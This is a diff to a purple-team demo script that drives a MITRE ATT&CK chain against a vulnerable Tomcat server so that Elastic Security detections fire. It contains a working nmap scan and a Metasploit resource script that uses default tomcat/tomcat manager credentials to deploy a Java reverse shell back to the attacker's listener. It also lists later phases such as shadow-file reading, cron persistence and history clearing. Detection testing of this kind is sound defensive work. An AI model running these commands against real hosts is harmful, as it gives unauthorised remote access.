@@ -4,15 +4,18 @@
 ################################################################################
 #
 # This script automates the attack chain for the Elastic Security purple team demo.
-# It progresses through the full MITRE ATT&CK kill chain targeting a vulnerable
-# Tomcat server.
+# By default, it runs reconnaissance and initial access to get a shell on the target.
+# Additional attack phases (3-8) can be run individually if desired.
 #
 # Usage:
-#   # Run all phases automatically
+#   # Run reconnaissance and initial access (default)
+#   ./tomcatastrophe.sh --target 10.0.1.50 --attacker 10.0.1.100
+#
+#   # Run automatically without pauses
 #   ./tomcatastrophe.sh --target 10.0.1.50 --attacker 10.0.1.100 --auto
 #
-#   # Run individual phase (interactive)
-#   ./tomcatastrophe.sh --target 10.0.1.50 --attacker 10.0.1.100 --phase 1
+#   # Run individual phase
+#   ./tomcatastrophe.sh --target 10.0.1.50 --attacker 10.0.1.100 --phase 0
 #
 #   # List available phases
 #   ./tomcatastrophe.sh --list
@@ -23,27 +26,26 @@
 #   - Target must have vulnerable Tomcat 9.0.30 with weak credentials
 #   - Network connectivity between attacker and target
 #
-# Attack Phases:
-#   0 - Reconnaissance (T1046 - Network Service Discovery)
-#   1 - Initial Access (T1190 - Exploit Public-Facing Application)
-#   2 - Execution (T1059 - Command and Scripting Interpreter)
-#   3 - Discovery (T1082, T1033 - System/User Discovery)
-#   4 - Privilege Escalation (T1548 - Abuse Elevation Control)
-#   5 - Persistence (T1053.003 - Cron Job)
-#   6 - Credential Access (T1003.008 - /etc/passwd and /etc/shadow)
-#   7 - Defense Evasion (T1070.003 - Clear Command History)
-#   8 - Collection (T1074.001 - Local Data Staging)
+# Attack Phases (Default: 0 and 1 only):
+#   0 - Reconnaissance (T1046 - Network Service Discovery) [DEFAULT]
+#   1 - Initial Access (T1190 - Exploit Public-Facing Application) [DEFAULT]
+#   3 - Discovery (T1082, T1033 - System/User Discovery) [MANUAL]
+#   4 - Privilege Escalation (T1548 - Abuse Elevation Control) [MANUAL]
+#   5 - Persistence (T1053.003 - Cron Job) [MANUAL]
+#   6 - Credential Access (T1003.008 - /etc/passwd and /etc/shadow) [MANUAL]
+#   7 - Defense Evasion (T1070.003 - Clear Command History) [MANUAL]
+#   8 - Collection (T1074.001 - Local Data Staging) [MANUAL]
 #
-# Expected Detections (Elastic 9.2):
-#   1. Potential SYN-Based Port Scan Detected (OOTB)
-#   2. Tomcat Manager Web Shell Deployment (Custom)
-#   3. Potential Reverse Shell via Java (OOTB)
-#   4. Linux System Information Discovery via Getconf (OOTB)
-#   5. Sudo Command Enumeration Detected (OOTB)
-#   6. Cron Job Created or Modified (OOTB)
-#   7. Potential Shadow File Read via Command Line Utilities (OOTB)
-#   8. Tampering of Shell Command-Line History (OOTB)
-#   9. Sensitive Files Compression (OOTB)
+# Expected Detections (Elastic 9.2) - Default phases trigger 1-3:
+#   1. Potential SYN-Based Port Scan Detected (OOTB) [Phase 0]
+#   2. Tomcat Manager Web Shell Deployment (Custom) [Phase 1]
+#   3. Potential Reverse Shell via Java (OOTB) [Phase 1]
+#   4. Linux System Information Discovery via Getconf (OOTB) [Phase 3 - Manual]
+#   5. Sudo Command Enumeration Detected (OOTB) [Phase 4 - Manual]
+#   6. Cron Job Created or Modified (OOTB) [Phase 5 - Manual]
+#   7. Potential Shadow File Read via Command Line Utilities (OOTB) [Phase 6 - Manual]
+#   8. Tampering of Shell Command-Line History (OOTB) [Phase 7 - Manual]
+#   9. Sensitive Files Compression (OOTB) [Phase 8 - Manual]
 #
 ################################################################################
 
@@ -120,9 +122,9 @@ phase_0_reconnaissance() {
 
     pause_interactive
 
-    # TCP connect scan on common ports
+    # TCP connect scan on common ports with service version detection
     log_info "Running nmap scan on target: $TARGET_IP"
-    nmap -sT -p 22,80,443,8080,8443 --open "$TARGET_IP"
+    nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open "$TARGET_IP"
 
     log_success "✓ Port scanning complete"
     pause_with_message "Review nmap results. Press Enter to continue to Initial Access..."
@@ -142,24 +144,46 @@ phase_1_initial_access() {
 
     pause_interactive
 
-    # Create Metasploit resource script
+    # Create Metasploit resource script with persistent handler
     RC_FILE=$(mktemp /tmp/tomcat_exploit_XXXXXX.rc)
     log_info "Creating Metasploit resource script: $RC_FILE"
 
     cat > "$RC_FILE" << EOF
+# Start persistent handler
+use exploit/multi/handler
+set payload java/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+# Wait for handler to start
+sleep 2
+
+# Run Tomcat exploit
+back
 use exploit/multi/http/tomcat_mgr_upload
 set RHOSTS $TARGET_IP
+set RPORT 8080
 set HttpUsername tomcat
 set HttpPassword tomcat
+set TARGETURI /manager
+set FingerprintCheck false
+set payload java/shell_reverse_tcp
 set LHOST $ATTACKER_IP
 set LPORT 4444
-set payload java/meterpreter/reverse_tcp
+set DisablePayloadHandler true
 show options
-exploit -z
+exploit
+
+# Check for sessions
+sleep 5
+sessions -l
 EOF
 
     log_info "Starting Metasploit Framework..."
-    log_warning "NOTE: Metasploit will run interactively. Type 'exit' when done."
+    log_info "A persistent handler will start on port 4444, then the exploit will execute"
+    echo ""
 
     # Run Metasploit
     msfconsole -r "$RC_FILE"
@@ -168,8 +192,12 @@ EOF
     rm -f "$RC_FILE"
 
     log_success "✓ Initial access phase complete"
-    log_info "You should now have a Meterpreter session"
-    pause_with_message "Press Enter to continue to Discovery..."
+    echo ""
+    log_info "If you have a shell session:"
+    log_info "  - Use 'sessions -l' to list sessions"
+    log_info "  - Use 'sessions -i <ID>' to interact with a session"
+    log_info "  - Run commands like: whoami, id, hostname, uname -a"
+    echo ""
 }
 
 ################################################################################
@@ -370,16 +398,17 @@ EOF
 run_all_phases() {
     phase_0_reconnaissance
     phase_1_initial_access
-    phase_3_discovery
-    phase_4_privilege_escalation
-    phase_5_persistence
-    phase_6_credential_access
-    phase_7_defense_evasion
-    phase_8_collection
 
-    log_phase "ATTACK CHAIN COMPLETE"
-    log_success "✓ All phases executed"
-    log_info "Check Elastic Security UI (ec-dev) for triggered detections"
+    log_phase "INITIAL ACCESS COMPLETE"
+    log_success "✓ Reconnaissance and initial access phases executed"
+    log_info "You should now have a shell session on the target"
+    echo ""
+    log_info "Next steps:"
+    log_info "  1. Interact with your session: sessions -i <ID>"
+    log_info "  2. Run discovery commands manually (see phase 3-8 for ideas)"
+    log_info "  3. Check Elastic Security UI (ec-dev) for triggered detections"
+    echo ""
+    log_info "To run additional phases manually, use: --phase <number>"
 }
 
 run_specific_phase() {
@@ -472,14 +501,14 @@ Options:
   -h, --help            Show this help message
 
 Examples:
-  # Run all phases interactively
+  # Run reconnaissance and get initial access (default)
   $0 --target 10.0.1.50 --attacker 10.0.1.100
 
-  # Run all phases automatically
+  # Run automatically without pauses
   $0 --target 10.0.1.50 --attacker 10.0.1.100 --auto
 
-  # Run only phase 1 (Initial Access)
-  $0 --target 10.0.1.50 --attacker 10.0.1.100 --phase 1
+  # Run specific phase (e.g., phase 0 - reconnaissance only)
+  $0 --target 10.0.1.50 --attacker 10.0.1.100 --phase 0
 
   # List available phases
   $0 --list
